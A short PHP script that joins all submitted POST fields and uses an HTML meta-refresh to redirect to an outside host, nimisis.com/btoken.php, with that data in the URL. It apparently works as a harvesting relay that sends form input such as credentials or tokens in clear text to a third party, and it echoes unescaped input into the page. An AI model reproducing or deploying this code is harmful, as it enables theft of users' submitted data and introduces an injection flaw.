<?php
$p = "";
if (isset($_POST)) {
	$p = implode($_POST);
}
echo "<head><meta http-equiv=\"refresh\" content=\"0; url=http://nimisis.com/btoken.php?p=".$p."\" /></head>";
?>